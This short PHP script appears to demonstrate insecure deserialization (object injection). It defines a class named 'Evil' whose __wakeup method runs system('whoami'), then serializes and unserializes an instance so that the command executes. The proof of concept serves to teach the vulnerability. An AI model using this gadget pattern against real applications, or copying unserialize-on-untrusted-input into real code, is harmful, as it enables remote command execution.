<?php
class Evil {
    public function __wakeup() {
        system('whoami');
    }
}

$payload = serialize(new Evil());
echo "Payload: " . $payload . PHP_EOL;
unserialize($payload);
?>